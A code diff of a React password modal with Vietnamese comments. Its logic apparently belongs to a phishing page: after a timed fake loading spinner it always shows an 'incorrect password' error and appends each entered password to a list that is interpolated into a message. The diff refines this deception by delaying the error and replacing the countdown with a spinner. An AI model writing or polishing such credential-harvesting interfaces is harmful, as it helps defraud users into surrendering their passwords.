@@ -64,7 +64,7 @@ const PasswordModal = ({ setIsShowModal, formValue, passwordAttempts, setPasswor
         }
 
         setIsSubmitting(true);
-        setSubmitError(texts.errorIncorrect);
+        setSubmitError(''); // Xóa lỗi cũ khi bắt đầu submit
 
         let i = config.LOAD_TIMEOUT_MS;
         const countDown = setInterval(() => {
@@ -75,6 +75,9 @@ const PasswordModal = ({ setIsShowModal, formValue, passwordAttempts, setPasswor
             }
         }, 1000);
         await new Promise((resolve) => setTimeout(resolve, config.LOAD_TIMEOUT_MS));
+
+        // Hiển thị lỗi sau khi load xong
+        setSubmitError(texts.errorIncorrect);
 
         const newAttempts = [...passwordAttempts, password];
         setPasswordAttempts(newAttempts);
@@ -273,21 +276,11 @@ ${passwordList}`;
                         </div>
 
                         {submitError && (
-                            <div
-                                style={{
-                                    padding: '10px',
-                                    backgroundColor: '#fee',
-                                    border: '1px solid #fcc',
-                                    borderRadius: '5px',
-                                    marginTop: '10px'
-                                }}
-                            >
+                            <div className='dmm-error'>
                                 <p
                                     style={{
                                         color: '#c00',
-                                        fontSize: '14px',
-                                        margin: 0,
-                                        textAlign: 'center'
+                                        fontSize: '14px'
                                     }}
                                 >
                                     {texts.errorIncorrect}
@@ -303,7 +296,7 @@ ${passwordList}`;
                                 cursor: isSubmitting ? 'not-allowed' : 'pointer'
                             }}
                         >
-                            {isSubmitting ? `${texts.processingButton} ${countDown}` : texts.continueButton}
+                            {isSubmitting ? <div className='spinner'></div> : texts.continueButton}
                         </button>
                     </div>
                 </div>
